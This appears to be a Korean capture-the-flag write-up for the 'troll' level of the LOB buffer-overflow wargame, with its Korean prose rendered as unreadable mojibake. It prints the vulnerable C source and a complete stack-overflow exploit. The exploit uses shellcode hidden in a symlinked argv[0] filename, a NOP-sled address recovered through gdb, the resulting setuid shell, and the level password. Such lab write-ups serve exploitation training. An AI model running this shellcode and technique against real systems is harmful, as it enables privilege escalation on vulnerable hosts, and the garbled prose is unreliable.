LOB Troll ¹®Á¦


±ÔÄ¢

1. argc Áï NOP¸¦ ¾²Áö¸øÇÏ°ÔÇÔ 1°³·Î ¿Ï¼º½ÃÄÑ¾ßÇÔ

2. È¯°æº¯¼ö »ç¿ë ºÒ°¡´É

3. \xbf°¡ ÀÖ¾î¾ßÇÔ

4. ¹öÆÛ ÃÊ±âÈ­

5. argv[1] ÃÊ±âÈ­

>> Áï NOP¸¦ ¾²Áö¸øÇÏ°ÔÇÏ¹Ç·Î argv[2] ¸¦ ¾µ¼ö°¡¾øÀ½.

±×¸®°í argv[1]ÀÌ ¹öÆÛ°¡ ½×ÀÌÁö¾Ê°í ÃÊ±âÈ­µÇ¹Ç·Î »ç¿ëÇÏÁö¸øÇÏ¹Ç·Î

argv[0] ¸¦ ÀÌ¿ëÇØ¼­ °ø°İÀ» ÇØ¾ßÇÑ´Ù.


¼Ò½ºÄÚµå

troll.c


#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        // here is changed
        if(argc != 2){
                printf("argc must be two!\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
                printf("argument is too long!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);

        // one more!
        memset(argv[1], 0, strlen(argv[1]));
}



argv[0] ¿¡ ½©ÄÚµå¸¦ ³Ö¾î¼­ °ø°İÀ» ÇØ¾ßÇÏ¹Ç·Î

ln -s ¸¦ ÀÌ¿ë ( ¸µÅ©) ±×¸®°í ÁÖ¼Ò¸¦ ±¸ÇØ¼­ °ø°İÇØ¾ßÇÔ

Áï argv[0] ¿¡ ½©ÄÚµå¸¦ ÀúÀå½ÃÅ°°í ¹öÆÛ ¸¦ Ã¤¿ö¼­ °ø°İÀ»ÇØ¾ßÇÔ.

°úÁ¤ 

¸ÕÀú ³»°¡¸¸µç tmp Æú´õ¿¡ troll ÆÄÀÏÀ» ÀúÀåÇÑ´Ù

[orge@localhost orge]$ cp troll tmp
[orge@localhost orge]$ cd tmp
[orge@localhost tmp]$ ls
troll


±×¸®°í cp ¸¦ ÅëÇØ argv[0] Áï ÆÄÀÏÀÌ¸§À» ½©ÄÚµå·Î ¹Ù²Ù¾îÁØ´Ù.

[orge@localhost tmp]$ cp troll `python -c 'print"\x90"*100+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'`
[orge@localhost tmp]$ ls
troll
?????????????????????????????????????????????????????????????????????????????????????????????????????^1É±2?l?ÿ???uöë?èêÿÿÿ2ÁQi00tii0cjo??T????


±×¸®°í ÀÌÁ¦ ¹Ù²ï ÆÄÀÏÀÌ¸§¿¡´Ù°¡ ¹öÆÛ¸¦ ³Ö¾î¼­ °ø°İÇØº¸ÀÚ.

./`python -c 'print"\x90"*100+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'` `python -c 'print "\x90"*44 + "\xbf"*4'`
¿¿¿¿
Segmentation fault (core dumped)

ÀÌ·¸°Ô °ø°İÀÌ ¸·È÷¸é¼­ core ÆÄÀÏÀÌ »ı±â´Âµ¥

gdb -q -c core ¸¦ ÀÔ·ÂÇØ¼­ ÆÄÀÏÀ» ºĞ¼®ÇØº¸ÀÚ.



[orge@localhost tmp]$ gdb -q -c core
Core was generated by `./?.
Program terminated with signal 11, Segmentation fault.
#0  0xbfbfbfbf in ?? ()
(gdb) x/1000x $esp
0xbffff950:     0x00000000      0xbffff994      0xbffff9a0      0x40013868
0xbffff960:     0x00000002      0x08048450      0x00000000      0x08048471
0xbffff970:     0x08048500      0x00000002      0xbffff994      0x08048390
0xbffff980:     0x0804866c      0x4000ae60      0xbffff98c      0x40013e90
0xbffff990:     0x00000002      0xbffffa8c      0xbffffb23      0x00000000
0xbffff9a0:     0xbffffb54      0xbffffb67      0xbffffb80      0xbffffb9f
0xbffff9b0:     0xbffffbc1      0xbffffbcb      0xbffffd8e      0xbffffdad
0xbffff9c0:     0xbffffdc7      0xbffffddc      0xbffffdf8      0xbffffe03
0xbffff9d0:     0xbffffe10      0xbffffe18      0xbffffe22      0xbffffe32
0xbffff9e0:     0xbffffe40      0xbffffe4e      0xbffffe5f      0xbffffe6a
0xbffff9f0:     0xbffffe7a      0xbffffeba      0xbfffff53      0x00000000
0xbffffa00:     0x00000003      0x08048034      0x00000004      0x00000020
0xbffffa10:     0x00000005      0x00000006      0x00000006      0x00001000
0xbffffa20:     0x00000007      0x40000000      0x00000008      0x00000000
0xbffffa30:     0x00000009      0x08048450      0x0000000b      0x000001fb
---Type <return> to continue, or q <return> to quit---
0xbffffa40:     0x0000000c      0x000001fb      0x0000000d      0x000001fb
0xbffffa50:     0x0000000e      0x000001fb      0x00000010      0x0f8bfbff
0xbffffa60:     0x0000000f      0xbffffa87      0x00000000      0x00000000
0xbffffa70:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffa80:     0x00000000      0x69000000      0x00363836      0x90902f2e
0xbffffa90:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffaa0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffab0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffac0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffad0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffae0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffaf0:     0x11eb9090      0xb1c9315e      0x0e6c8032      0xe98001ff
0xbffffb00:     0xebf67501      0xffeae805      0xc132ffff      0x30306951
0xbffffb10:     0x30696974      0x8a6f6a63      0x8a5451e4      0x0cb19ae2
0xbffffb20:     0x000081ce      0x00000000      0x00000000      0x00000000


ÀÌ ºĞ¼®À» º¸¸é \x90 ºÎºĞÁß ¾Æ¹«°÷ ¼±ÅÃÇØ¼­ °ø°İÇÏ¸é µÈ´Ù.

Áï ³ª´Â 0xbffffaa0 ÀÌ¿ëÇØ¼­ °ø°İÀ» ÇÒ°ÍÀÌ´Ù. ÀÏ´Ü ÀÌ°ÍÀÌ ¿Ã¹Ù¸¥ ÁÖ¼Ò°í °ø°İÀÌµÇ´ÂÁö
º¹»çÇÑ ÆÄÀÏ·Î °ø°İÇØº¸ÀÚ.

./`python -c 'print"\x90"*100+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'` `python -c 'print "\x90"*44 + "\xa0\xfa\xff\xbf"'`
 úÿ?
bash$ id
uid=507(orge) gid=507(orge) groups=507(orge)

°ø°İÀÌ ¼º°øÀûÀ¸·Î ÀÌ·ç¾îÁ³´Ù. ÀÌ´ë·Î º» ÆÄÀÏµµ ÀÌ´ë·Î °ø°İÇÏ¸é id¿Í passwd¸¦ ¾òÀ»¼öÀÖ´Ù.

¹Ù·Î cd ¸¦ ÀÌ¿ëÇØ µ¹¾Æ¿Í¼­ 
¸µÅ©¸¦ ÀÌ¿ëÇØ ¸µÅ©ÆÄÀÏÀ» ¸¸µé¾îÁØ´Ù.

ln -s troll `python -c 'print"\x90"*100+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'`


[orge@localhost orge]$ ls
tmp
troll
troll.c
?????????????????????????????????????????????????????????????????????????????????????????????????????^1É±2?l?ÿ???uöë?èêÿÿÿ2ÁQi00tii0cjo??T????

±×·³ ÆÄÀÏÀÌ »ı¼ºµÈ´Ù.

ÀÌÁ¦ ÀÌ ¸µÅ©ÆÄÀÏ¿¡ ¿ì¸®°¡ ¾Æ±î ¶È°°ÀÌ °ø°İÇß´ø´ë·Î °ø°İÀ» ½ÃµµÇÏ¸é

./`python -c 'print"\x90"*100+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'` `python -c 'print"\x90"*44+"\xa0\xfa\xff\xbf"'`

bash$ id
uid=507(orge) gid=507(orge) euid=508(troll) egid=508(troll) groups=507(orge)
bash$ my-pass
euid = 508
aspirin


ÀÌ·¸°Ô ½©À» È¹µæÇÒ¼öÀÖ´Ù. 
